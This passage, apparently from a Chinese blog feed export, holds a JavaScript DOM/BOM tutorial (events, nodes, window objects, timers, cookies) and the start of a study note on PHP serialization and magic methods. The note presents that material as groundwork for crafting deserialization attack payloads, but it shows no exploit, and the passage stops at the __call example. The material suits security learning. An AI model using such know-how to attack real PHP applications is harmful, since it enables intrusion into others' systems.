第一个参数是事件的类型 (如 “click” 或 “mousedown”)；第二个参数是事件触发后调用的函数；第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的
注意：事件不需要加”on”前缀
向元素添加事件句柄
&lt;script&gt;document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;, function()&#123;    alert(&quot;Hello World!&quot;);&#125;);&lt;/script&gt;

除了上述方法，也可以使用函数名，引用外部函数
document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;, myFunction);function myFunction() &#123;    alert (&quot;Hello World!&quot;);&#125;

addEventListener() 方法允许向同一个元素添加多个事件，且不会覆盖已存在的事件
可以向同个元素添加不同类型的事件
let x=document.getElementById(&quot;muBtn&quot;)x.addEventListener(&quot;click&quot;,showDate)x.addEventListener(&quot;mouseover&quot;,first);x.addEventListener(&quot;mouseout&quot;,second);function showDate()&#123;  let date=Date();  document.getElementById(&quot;demo&quot;).innerHTML+=date+&quot;&lt;br&gt;&quot;;&#125;function first()&#123;  document.getElementById(&quot;demo&quot;).innerHTML+=&quot;first&lt;br&gt;&quot;&#125;function second()&#123;  document.getElementById(&quot;demo&quot;).innerHTML+=&quot;second&lt;br&gt;&quot;&#125;

向window对象添加事件句柄
addEventListener() 方法允许你在 HTML DOM 对象添加事件监听， HTML DOM 对象如： HTML 元素, HTML 文档, window 对象。或者其他支持的事件对象如: xmlHttpRequest 对象
&lt;script&gt;//重置窗口大小的时候会触发&quot;resize&quot; 事件句柄window.addEventListener(&quot;resize&quot;, function()&#123;    document.getElementById(&quot;demo&quot;).innerHTML = Math.random();&#125;);&lt;/script&gt;

传递参数
当传递参数值时，使用”匿名函数”调用带参数的函数
let p1=5;let p2=4;document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;,function()&#123;  myFunction(p1,p2);&#125;);function myFunction(a,b)&#123;  var result=a*b;  document.getElementById(&quot;demo&quot;).innerHTML=result;&#125;

document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;,myFunction(p1, p2));错误原因：事件监听器中的函数应该是一个函数的引用，而不是一个函数的调用。因此，在添加事件监听器时，应该传递函数名而不是调用函数。myFunction(p1, p2) 是一个函数调用，而不是函数的引用。
事件冒泡或捕获
事件传递有两种方式：冒泡与捕获。
事件传递定义了元素事件触发的顺序。 如果你将  元素插入到  元素中，用户点击  元素, 哪个元素的 “click” 事件先被触发呢？
在 冒泡 中，内部元素的事件会先被触发，然后再触发外部元素，即：  元素的点击事件先触发，然后会触发  元素的点击事件。
在 捕获 中，外部元素的事件会先被触发，然后才会触发内部元素的事件，即：  元素的点击事件先触发 ，然后再触发  元素的点击事件。
addEventListener() 方法可以指定 “useCapture” 参数来设置传递类型：
addEventListener(event,function,useCapture);

默认值为 false, 即冒泡传递，当值为 true 时, 事件使用捕获传递。
&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;style&gt;div &#123;    background-color: coral;    border: 1px solid;    padding: 50px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;myDiv&quot;&gt;	&lt;p id=&quot;myP&quot;&gt;点击段落，我是冒泡。&lt;/p&gt;&lt;/div&gt;&lt;br&gt;&lt;div id=&quot;myDiv2&quot;&gt;	&lt;p id=&quot;myP2&quot;&gt;点击段落，我是捕获。 &lt;/p&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(&quot;myP&quot;).addEventListener(&quot;click&quot;, function() &#123;    alert(&quot;你点击了 P 元素!&quot;);&#125;, false);document.getElementById(&quot;myDiv&quot;).addEventListener(&quot;click&quot;, function() &#123;    alert(&quot; 你点击了 DIV 元素 !&quot;);&#125;, false);document.getElementById(&quot;myP2&quot;).addEventListener(&quot;click&quot;, function() &#123;    alert(&quot;你点击了 P2 元素!&quot;);&#125;, true);document.getElementById(&quot;myDiv2&quot;).addEventListener(&quot;click&quot;, function() &#123;    alert(&quot;你点击了 DIV2 元素 !&quot;);&#125;, true);&lt;/script&gt;&lt;/body&gt;

removeEventListener() 方法
removeEventListener() 方法移除由 addEventListener() 方法添加的事件句柄:
&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;薯条的测试&lt;/title&gt;  &lt;style&gt;    #myDIV &#123;      background-color: coral;      border: 1px solid;      padding: 50px;      color: white;    &#125;  &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;开始测试&lt;/h1&gt;&lt;div id=&quot;myDIV&quot;&gt; div 元素添加了 onmousemove 事件句柄，鼠标在桔红色的框内移动时会显示随机数。  &lt;p&gt;点击按钮移除 DIV 的事件句柄。&lt;/p&gt;  &lt;button onclick=&quot;removeHandler()&quot; id=&quot;myBtn&quot;&gt;点我&lt;/button&gt;&lt;/div&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;script&gt;  document.getElementById(&quot;myDIV&quot;).addEventListener(&quot;mousemove&quot;, myFunction);  function myFunction() &#123;    document.getElementById(&quot;demo&quot;).innerHTML = Math.random();  &#125;  function removeHandler() &#123;    document.getElementById(&quot;myDIV&quot;).removeEventListener(&quot;mousemove&quot;, myFunction);  &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;

DOM元素（节点）如何向文档中添加和移除元素
创建新的 HTML 元素 (节点) - appendChild()
&lt;div id=&quot;div1&quot;&gt;&lt;p id=&quot;p1&quot;&gt;这是一个段落。&lt;/p&gt;&lt;p id=&quot;p2&quot;&gt;这是另外一个段落。&lt;/p&gt;&lt;/div&gt;&lt;script&gt;var para = document.createElement(&quot;p&quot;);var node = document.createTextNode(&quot;这是一个新的段落。&quot;);para.appendChild(node);var element = document.getElementById(&quot;div1&quot;);element.appendChild(para);&lt;/script&gt;

解析：这行代码是用于创建  元素:var para = document.createElement(&quot;p&quot;);
为  元素创建一个新的文本节点：var node = document.createTextNode(&quot;这是一个新的段落。&quot;);
将文本节点添加到  元素中：para.appendChild(node);
最后，在一个已存在的元素中添加 p 元素。
查找已存在的元素：var element = document.getElementById(&quot;div1&quot;);
添加到已存在的元素中:element.appendChild(para);
创建新的 HTML 元素 (节点) - insertBefore()
 appendChild() 方法:它用于添加新元素到尾部
 insertBefore() 方法:将新元素添加到开始位置
HTML代码跟appendChild()方法里面的代码一致，js代码如下所示：var para = document.createElement(&quot;p&quot;);var node = document.createTextNode(&quot;这是一个新的段落。&quot;);para.appendChild(node);var element = document.getElementById(&quot;div1&quot;);var child = document.getElementById(&quot;p1&quot;);element.insertBefore(para, child);//新元素插到child元素之前

移除已存在的元素
要移除之前我们必须知道该元素的父元素
&lt;div id=&quot;div1&quot;&gt;&lt;p id=&quot;p1&quot;&gt;这是一个段落。&lt;/p&gt;&lt;p id=&quot;p2&quot;&gt;这是另外一个段落。&lt;/p&gt;&lt;/div&gt;&lt;script&gt;var parent = document.getElementById(&quot;div1&quot;);var child = document.getElementById(&quot;p1&quot;);parent.removeChild(child);parent.parentNode.removeChild(parent);&lt;/script&gt;

parent.parentNode.removeChild(parent);：parentNode 是一个 DOM 属性，它指向节点的父节点。在这个特定的代码中，parent 是一个通过 document.getElementById(&quot;div1&quot;) 获取到的 &lt;div&gt; 元素，因此 parent.parentNode 就是 &lt;div&gt; 元素的父节点
替换元素-replaceChild()
用 replaceChild() 方法来替换 HTML DOM 中的元素
&lt;script&gt;var para = document.createElement(&quot;p&quot;);var node = document.createTextNode(&quot;这是一个新的段落。&quot;);para.appendChild(node);var parent = document.getElementById(&quot;div1&quot;);var child = document.getElementById(&quot;p1&quot;);parent.replaceChild(para, child);&lt;/script&gt;

集合(Collection)getElementsByTagName() 方法返回 HTMLCollection 对象。
HTMLCollection 对象类似包含 HTML 元素的一个数组。
集合中的元素可以通过索引(以 0 为起始位置)来访问
&lt;p&gt;MNC&lt;/p&gt;&lt;p&gt;曼城&lt;/p&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;script&gt;  let myCollection=document.getElementsByTagName(&quot;p&quot;);//myCollection为HTMLCollection 对象  let a=myCollection[1].innerHTML; // 使用 textContent 获取文本内容  document.getElementById(&quot;demo&quot;).innerHTML=`第二个段落是$&#123;a&#125;`;&lt;/script&gt;

HTMLCollection 对象的 length 属性定义了集合中元素的数量，例子如下：
在上述js代码后面再加上：document.getElementById(&quot;demo&quot;).innerHTML = &quot;文档包含&quot; + myCollection.length + &quot; 个段落。&quot;;

集合 length 属性常用于遍历集合中的元素
var myCollection = document.getElementsByTagName(&quot;p&quot;);var i;for (i = 0; i &lt; myCollection.length; i++) &#123;    myCollection[i].style.backgroundColor = &quot;red&quot;;&#125;

NodeList对象NodeList 对象是一个从文档中获取的节点列表 (集合) ，类似 HTMLCollection 对象，用法也与它差不多
所有浏览器的 childNodes 属性返回的是 NodeList 对象。
大部分浏览器的 querySelectorAll() 返回 NodeList 对象。
var myNodelist = document.querySelectorAll(&quot;p&quot;);

浏览器对象模型 (BOM)window所有 JavaScript 全局对象、函数以及变量均自动成为 window 对象的成员。
全局变量是 window 对象的属性。
全局函数是 window 对象的方法。
window尺寸
有三种方法能够确定浏览器窗口的尺寸。
对于Internet Explorer、Chrome、Firefox、Opera 以及 Safari：

window.innerHeight - 浏览器窗口的内部高度(包括滚动条)
window.innerWidth - 浏览器窗口的内部宽度(包括滚动条)

对于 Internet Explorer 8、7、6、5：

document.documentElement.clientHeight
document.documentElement.clientWidth

或者

document.body.clientHeight
document.body.clientWidth

&lt;script&gt;  let w=window.innerWidth        ||document.documentElement.clientWidth        ||document.body.clientWidth;  let h=window.innerHeight        ||document.documentElement.clientHeight        ||document.body.clientHeight;  let x=document.getElementById(&quot;demo&quot;);  x.innerHTML=`浏览器宽度为$&#123;w&#125;，高度为$&#123;h&#125;。`&lt;/script&gt;

window的其他一些方法：

window.open() - 打开新窗口
window.close() - 关闭当前窗口
window.moveTo() - 移动当前窗口
window.resizeTo() - 调整当前窗口的尺寸

Window Screenwindow.screen 对象包含有关用户屏幕的信息
window.screen对象在编写时可以不使用 window 这个前缀。
一些属性：

screen.availWidth - 返回访问者屏幕的宽度，以像素计，减去界面特性，比如窗口任务栏document.write(&quot;可用宽度: &quot; + screen.availWidth);
screen.availHeight - 返回访问者屏幕的高度，以像素计，减去界面特性，比如窗口任务栏 document.write(&quot;可用高度: &quot; + screen.availHeight);

Window Locationwindow.location 对象在编写时可不使用 window 这个前缀。 一些例子：
一些实例:

location.hostname 返回 web 主机的域名
location.pathname 返回当前页面的路径和文件名:document.write(location.pathname);
location.port 返回 web 主机的端口 （80 或 443）
location.protocol 返回所使用的 web 协议（http: 或 https:）

location.href 属性返回当前页面的 URL。实例如下：
document.write(location.href);//返回完整的URL

location.assign() 方法加载新的文档。实例如下：
&lt;script&gt;function newDoc()&#123;    window.location.assign(&quot;https://www.runoob.com&quot;)&#125;&lt;/script&gt;&lt;input type=&quot;button&quot; value=&quot;加载新文档&quot; onclick=&quot;newDoc()&quot;&gt;

Window historywindow.history对象在编写时可不使用 window 这个前缀。
一些方法：

history.back() - 与在浏览器点击后退按钮相同

&lt;script&gt;function goBack()&#123;    window.history.back()&#125;&lt;/script&gt;&lt;input type=&quot;button&quot; value=&quot;Back&quot; onclick=&quot;goBack()&quot;&gt;


history.forward() - 与在浏览器中点击向前按钮相同：起作用的前提是你处于的不是最新界面

Window Navigatorwindow.navigator 对象包含有关访问者浏览器的信息，下面实例里面有几个弃用的，可以找到更好的替代
&lt;div id=&quot;example&quot;&gt;&lt;/div&gt;&lt;script&gt;txt = &quot;&lt;p&gt;浏览器代号: &quot; + navigator.appCodeName + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;浏览器名称: &quot; + navigator.appName + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;浏览器版本: &quot; + navigator.appVersion + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;启用Cookies: &quot; + navigator.cookieEnabled + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;硬件平台: &quot; + navigator.platform + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;用户代理: &quot; + navigator.userAgent + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;用户代理语言: &quot; + navigator.language + &quot;&lt;/p&gt;&quot;;document.getElementById(&quot;example&quot;).innerHTML=txt;&lt;/script&gt;

弹窗弹窗使用 反斜杠 + “n”(\n) 来设置换行：alert(&quot;Hello\nHow are you?&quot;);
警告窗
警告框经常用于确保用户可以得到某些信息。 alert(&quot;你好，我是一个警告框！&quot;);
当警告框出现后，用户需要点击确定按钮才能继续进行操作。
确认窗
确认框通常用于验证是否接受用户操作：window.confirm(&quot;sometext&quot;);wnidow.可加可不加
当确认框弹出时，用户可以点击 “确认” 或者 “取消” 来确定用户操作。
当你点击 “确认”, 确认框返回 true， 如果点击 “取消”, 确认框返回 false
&lt;script&gt;function myFunction()&#123;	var x;	var r=confirm(&quot;按下按钮!&quot;);	if (r==true)&#123;		x=&quot;你按下了\&quot;确定\&quot;按钮!&quot;;	&#125;	else&#123;		x=&quot;你按下了\&quot;取消\&quot;按钮!&quot;;	&#125;	document.getElementById(&quot;demo&quot;).innerHTML=x;&#125;&lt;/script&gt;

提示框
提示框经常用于提示用户在进入页面前输入某个值：window.prompt(&quot;sometext&quot;,&quot;defaultvalue&quot;);后面那个相当于预填充的值
当提示框出现后，用户需要输入某个值，然后点击确认或取消按钮才能继续操纵。
如果用户点击确认，那么返回值为输入的值。如果用户点击取消，那么返回值为 null。
&lt;script&gt;function myFunction()&#123;	var x;	var person=prompt(&quot;请输入你的名字&quot;,&quot;Harry Potter&quot;);	if (person!=null &amp;&amp; person!=&quot;&quot;)&#123;	    x=&quot;你好 &quot; + person + &quot;! 今天感觉如何?&quot;;	    document.getElementById(&quot;demo&quot;).innerHTML=x;	&#125;&#125;&lt;/script&gt;

计时事件通过使用 JavaScript，我们有能力做到在一个设定的时间间隔之后来执行代码，而不是在函数被调用后立即执行。我们称之为计时事件。
setInterval() 方法
setInterval() 间隔指定的毫秒数不停地执行指定的代码：setInterval(&quot;javascript function&quot;,milliseconds);
setInterval() 第一个参数是函数（function），第二个参数间隔的毫秒数
//3秒弹出一个&quot;hello&quot;警告窗function myFunction()&#123;	setInterval(function()&#123;alert(&quot;Hello&quot;)&#125;,3000);&#125;//显示时钟，并停止&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;button onclick=&quot;myStopFunction()&quot;&gt;停止&lt;/button&gt;&lt;script&gt;var myVar=setInterval(function()&#123;myTimer()&#125;,1000);function myTimer()&#123;	var d=new Date();	var t=d.toLocaleTimeString();	document.getElementById(&quot;demo&quot;).innerHTML=t;&#125;function myStopFunction()&#123;	clearInterval(myVar);&#125;&lt;/script&gt;

clearInterval() 方法用于停止 setInterval() 方法执行的函数代码：clearInterval(intervalVariable)
要使用 clearInterval() 方法, 在创建计时方法时你必须使用全局变量myVar=setInterval(&quot;javascriptfunction&quot;,milliseconds);
然后你可以使用 clearInterval() 方法来停止执行：clearInterval(myVar);
setTimeout()方法
具体知识在上面的“异步编程”一节中
&lt;body&gt;&lt;script&gt;function timedText()&#123;	var x=document.getElementById(&#x27;txt&#x27;);	var t1=setTimeout(function()&#123;x.value=&quot;2 秒&quot;&#125;,2000);	var t2=setTimeout(function()&#123;x.value=&quot;4 秒&quot;&#125;,4000);	var t3=setTimeout(function()&#123;x.value=&quot;6 秒&quot;&#125;,6000);&#125;&lt;/script&gt;&lt;form&gt;&lt;input type=&quot;button&quot; value=&quot;显示文本时间!&quot; onclick=&quot;timedText()&quot; /&gt;&lt;input type=&quot;text&quot; id=&quot;txt&quot; /&gt;&lt;/form&gt;&lt;p&gt;点击上面的按钮，输出的文本将告诉你2秒，4秒，6秒已经过去了。&lt;/p&gt;&lt;/body&gt;

clearTimeout() 方法用于停止执行setTimeout()方法的函数代码
要使用clearTimeout() 方法, 你必须在创建超时方法中（setTimeout）使用全局变量:
CookieJavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。
创建cookie
JavaScript 中，创建 cookie 如下所示：
document.cookie=&quot;username=John Doe&quot;;
您还可以为 cookie 添加一个过期时间（以 UTC 或 GMT 时间）。默认情况下，cookie 在浏览器关闭时删除：
document.cookie=&quot;username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT&quot;;
您可以使用 path 参数告诉浏览器 cookie 的路径。默认情况下，cookie 属于当前页面。
document.cookie=&quot;username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/&quot;;
读取cookie
格式：var x = document.cookie;

document.cookie 将以字符串的方式返回所有的 cookie，类型格式： cookie1&#x3D;value; cookie2&#x3D;value; cookie3&#x3D;value;
修改cookie
在 JavaScript 中，修改 cookie 类似于创建 cookie，如下所示：
document.cookie=&quot;username=John Smith; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/&quot;;

旧的 cookie 将被覆盖。
删除cookie
删除 cookie 非常简单。您只需要设置 expires 参数为以前的时间即可，如下所示，设置为 Thu, 01 Jan 1970 00:00:00 GMT:
document.cookie = &quot;username=; expires=Thu, 01 Jan 1970 00:00:00 GMT&quot;;

注意，当您删除时不必指定 cookie 的值。
一个关于cookie的完整实例
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;head&gt;&lt;script&gt;function setCookie(cname,cvalue,exdays)&#123;	var d = new Date();	d.setTime(d.getTime()+(exdays*24*60*60*1000));//毫秒数	var expires = &quot;expires=&quot;+d.toGMTString();	document.cookie = cname+&quot;=&quot;+cvalue+&quot;; &quot;+expires;&#125;//cookie 的名称为 cname，cookie 的值为 cvalue，并设置了 cookie 的过期时间 expiresfunction getCookie(cname)&#123;//cookie 名的参数为 cname	var name = cname + &quot;=&quot;;//创建一个文本变量用于检索指定 cookie 	var ca = document.cookie.split(&#x27;;&#x27;);//使用分号来分割 document.cookie 字符串，并将分割后的字符串数组赋值给 ca	for(var i=0; i&lt;ca.length; i++) &#123;		var c = ca[i].trim();		if (c.indexOf(name)==0) &#123; return c.substring(name.length,c.length); &#125;	&#125;//循环 ca 数组 (i=0;i&lt;ca.length;i++)，然后读取数组中的每个值，并去除前后空格 (c=ca[i].trim())	return &quot;&quot;;&#125;//如果找到 cookie(c.indexOf(name) == 0)，返回 cookie 的值；没有找到 cookie, 返回 &quot;&quot;function checkCookie()&#123;	var user=getCookie(&quot;username&quot;);	if (user!=&quot;&quot;)&#123;		alert(&quot;欢迎 &quot; + user + &quot; 再次访问&quot;);	&#125;	else &#123;		user = prompt(&quot;请输入你的名字:&quot;,&quot;&quot;);  		if (user!=&quot;&quot; &amp;&amp; user!=null)&#123;    		setCookie(&quot;username&quot;,user,30);    	&#125;	&#125;&#125;如果设置了 cookie，将显示一个问候信息。如果没有设置 cookie，将会显示一个弹窗用于询问访问者的名字，并调用 setCookie 函数将访问者的名字存储 365 天&lt;/script&gt;&lt;/head&gt;&lt;body onload=&quot;checkCookie()&quot;&gt;&lt;/body&gt;&lt;/html&gt;

这里使用 substring() 方法获取从名称长度到字符串末尾的子字符串，即获取了指定名称的 cookie 的值，并将其返回。
其他网页上显示一个钟表
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;script&gt;function startTime()&#123;	var today=new Date();	var h=today.getHours();	var m=today.getMinutes();	var s=today.getSeconds();// 在小于10的数字前加一个‘0’	m=checkTime(m);	s=checkTime(s);	document.getElementById(&#x27;txt&#x27;).innerHTML=h+&quot;:&quot;+m+&quot;:&quot;+s;	t=setTimeout(function()&#123;startTime()&#125;,500);&#125;function checkTime(i)&#123;	if (i&lt;10)&#123;		i=&quot;0&quot; + i;	&#125;	return i;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=&quot;startTime()&quot;&gt;&lt;div id=&quot;txt&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;

不止以上这一种方法
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化学习</title>
    <url>/2024/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0_max/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[基础理解PHP序列化：serialize()
序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。
而PHP反序列化：unserialize()
反序列化是将字符串转换成变量或对象的过程
通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。这样说可能还不是很具体，举个列子比如你网购买一个架子，发货为节省成本，是拆开给你发过去，到你手上，然后给你说明书让你组装，拆开给你这个过程可以说是序列化，你组装的过程就是反序列化
序列化首先每一个序列化后的小段都由; 隔开, 使用&#123;&#125;表示层级关系



数据类型
提示符
格式



字符串
s
s:长度:”内容”


已转义字符串
S
s:长度:”转义后的内容”


整数
i
i:数值


布尔值
b
b:1 &#x3D;&gt; true &#x2F; b:0 &#x3D;&gt; false


空值
N
N;


数组
a
a:大小:{键序列段;值序列段;&lt;重复多次&gt;}


对象
O
O:类型名长度:”类型名称”:成员数:{成员名称序列段;成员值序列段:}


引用
R
R:反序列化变量的序号, 从1开始


例子如下：
class Kengwang&#123;    public $name = &quot;kengwang&quot;;    public $age = 18;    public $sex = true;    public $route = LearningRoute::Web;    public $tag = array(&quot;dino&quot;, &quot;cdut&quot;, &quot;chengdu&quot;);    public $girlFriend = null;    private $pants = &quot;red&quot;; // not true&#125;

序列化后如下所示（下面经过整理，一般都为一行）：
O:8:&quot;Kengwang&quot;:7:&#123; // 定义了一个对象 [O], 对象名称长度为 [8], 对象类型数为 [7]    s:4:&quot;name&quot;;s:8:&quot;kengwang&quot;; // 第一个字段名称是[4]个长度的&quot;name&quot;, 值为长度为[8]的字符串([s]) &quot;kengwang&quot;     s:3:&quot;age&quot;;i:18; // 第二个字段名称是长度为[3]的&quot;age&quot;, 值为整数型([i]): 18    s:3:&quot;sex&quot;;b:1; // 第三个字段名称是长度为[3]的&quot;sex&quot;, 值为布尔型([b]): 1 -&gt; true    s:5:&quot;route&quot;;E:17:&quot;LearningRoute:Web&quot;; // 第四个字段名称是长度为[5]的&quot;route&quot;, 值为枚举类型([E]), 枚举值长度为 [17], 值为 &quot;...&quot;:    s:3:&quot;tag&quot;;a:3:&#123; // 长度为 [3] 的数组([a])    	i:0;s:4:&quot;dino&quot;; // 第[0]个元素    	i:1;s:4:&quot;cdut&quot;;    	i:2;s:7:&quot;chengdu&quot;;	&#125;	s:10:&quot;girlFriend&quot;;N; // 字段 &quot;girlFriend&quot; 为 NULL	s:15:&quot; Kengwang pants&quot;;s:3:&quot;red&quot;; // 私有字段名称为 类型名 字段名, 其中类型名用 NULL 字符包裹&#125;

关于非公有字段名称(\x00其实就是空格）:

private 使用: 私有的类的名称 (考虑到继承的情况) 和字段名组合 \x00类名称\x00字段名
protected 使用: * 和字段名组合 \x00*\x00字段名

魔术方法__construct（笔记php有详细解释）构造函数, 在对应对象实例化时自动被调用. 子类中的构造函数不会隐式调用父类的构造函数
__wakeup与 sleep () 方法相比，wakeup () 方法通常用于反序列化操作，例如重建数据库连接或执行其他初始化操作。
&lt;?phpclass Person&#123;    public $sex;    public $name;    public $age;    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;        $this-&gt;sex  = $sex;    &#125;    public function __sleep() &#123;        echo &quot;It is called when the serialize() method is called outside the class.&lt;br&gt;&quot;;        $this-&gt;name = base64_encode($this-&gt;name);        return array(&#x27;name&#x27;, &#x27;age&#x27;); //它必须返回一个值，该值的元素是返回的属性的名称    &#125;    public function __wakeup() &#123;        echo &quot;It is called when the unserialize() method is called outside the class.&lt;br&gt;&quot;;        $this-&gt;name = 2;        $this-&gt;sex = &#x27;Male&#x27;;        // There is no need to return an array here.    &#125;&#125;$person = new Person(&#x27;John&#x27;);var_dump(serialize($person));//var_dump():以易于阅读的方式显示变量的详细信息，包括类型、长度和值var_dump(unserialize(serialize($person)));代码运行结果如下：It is called when the serialize() method is called outside the class.string(58) &quot;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;&#125;&quot;It is called when the unserialize() method is called outside the class.object(Person)#2 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;Male&quot; [&quot;name&quot;]=&gt; int(2) [&quot;age&quot;]=&gt; int(25) &#125;

__sleepserialize () 方法将检查类中是否有魔术方法__sleep ()。如果存在，将首先调用该方法，然后执行序列化操作。
__sleep () 方法通常用于指定保存数据之前需要序列化的属性。如果有一些非常大的对象不需要全部保存，那么您会发现此功能非常有用。
&lt;?phpclass Person&#123;    public $sex;    public $name;    public $age;    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;        $this-&gt;sex  = $sex;    &#125;    public function __sleep() &#123;        echo &quot;It is called when the serialize() method is called outside the class.&lt;br&gt;&quot;;        $this-&gt;name = base64_encode($this-&gt;name);        return array(&#x27;name&#x27;, &#x27;age&#x27;); //它必须返回一个值，该值的元素是返回的属性的名称    &#125;&#125;$person = new Person(&#x27;John&#x27;); // Initially assigned.echo serialize($person);echo &#x27;&lt;br/&gt;&#x27;;显示结果如下：It is called when the serialize() method is called outside the class.O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;&#125;

__toString只要对象被当作字符串来用，就会调用__toString () 方法。
或者说是强制类型转换为string时，也会调用该方法：$a = (string)$obj，其中$obj为一个对象
再举个例子，eval函数的参数类型为字符串，当eval($obj)时，便会自动调动__toString()方法
但是要注意，在序列化的过程中是不会自动调用(string)方法的，所以我们要在序列化过程中调用__tostring方法的话就必须要用另一种方法，比如字符串的拼接：&quot;&quot;.$obj
注意：此方法必须返回一个字符串，否则将在 E_RECOVERABLE_ERROR 级别上引发致命错误。而且您也不能在__toString () 方法中抛出异常
public function __toString()   &#123;       return  &#x27;go go go&#x27;;   &#125;

当然, 因为 PHP 是一个弱类型语言, 很多情况对象会被隐式转换成字符串, 比如说

== 与字符串比较时会被隐式转换
字符串操作 (str系列函数), 字符串拼接, addslashes
一些参数需要为字符串的参数: class_exists , in_array(第一个参数), SQL 预编译语句, md5, sha1等
print, echo 函数

__get当试图访问对象中未定义或不可见的属性时会被自动调用
例子如下：
&lt;?phpclass Person&#123;    private $name;    private $age;    function __construct($name=&quot;&quot;, $age=1)    &#123;        $this-&gt;name = $name;        $this-&gt;age = $age;    &#125;    public function __get($propertyName)    &#123;           if ($propertyName == &quot;age&quot;) &#123;            if ($this-&gt;age &gt; 30) &#123;                return $this-&gt;age - 10;            &#125; else &#123;                return $this-&gt;$propertyName;            &#125;        &#125; else &#123;            return $this-&gt;$propertyName;        &#125;    &#125;&#125;$Person = new Person(&quot;John&quot;, 60);echo &quot;Name：&quot; . $Person-&gt;name . &quot;&lt;br&gt;&quot;;echo &quot;Age：&quot; . $Person-&gt;age . &quot;&lt;br&gt;&quot;; 显示结果如下：Name: JohnAge: 50

__set当你尝试给一个不可访问的属性（例如私有属性或不存在的属性）赋值时，__set() 会被自动调用
set ($property,$value) 方法用于设置类的私有属性。分配了未定义的属性后，将触发 set () 方法，并且传递的参数是设置的属性名称和值。例子如下：
&lt;?phpclass Person&#123;    private $name;    private $age;    public function __construct($name=&quot;&quot;,  $age=25)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;    &#125;    public function __set($property, $value) &#123;        if ($property==&quot;age&quot;)        &#123;            if ($value &gt; 150 || $value &lt; 0) &#123;                return;            &#125;        &#125;        $this-&gt;$property = $value;    &#125;    public function say()&#123;        echo &quot;My name is &quot;.$this-&gt;name.&quot;,I&#x27;m &quot;.$this-&gt;age.&quot; years old&quot;;    &#125;&#125;$Person=new Person(&quot;John&quot;, 25); //请注意，类初始化并为“name”和“age”分配初始值。$Person-&gt;name = &quot;Lili&quot;;     // &quot;name&quot; 属性值被成功修改。如果没有__set()方法，程序将报错。$Person-&gt;age = 16; // &quot;age&quot;属性修改成功。$Person-&gt;age = 160; //160是无效值，因此修改失败。$Person-&gt;say();  //输出:My name is Lili, I&#x27;m 16 years old。

__invoke把对象当做函数调用时会使用, 例如 $foo()
当然不仅限于显式调用, 将其作为回调函数 (例如 array_map作为第一个参数传入) 也会调用此函数
&lt;?phpclass Person&#123;    public $sex;    public $name;    public $age;    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;        $this-&gt;sex  = $sex;    &#125;    public function __invoke() &#123;        echo &#x27;This is an object&#x27;;    &#125;&#125;$person = new Person(&#x27;John&#x27;); // Initially assigned.$person();执行结果如下：This is an object

如果坚持使用对象作为方法 (但未定义__invoke () 方法)，会报错
__call调用未定义方法时会调用
该方法接受两个参数。第一个参数为未定义的方法名称，第二个参数则为传入方法的参数构成的数组，语法如下：
function __call(string $function_name, array $arguments)&#123;    // method body&#125;

实例：
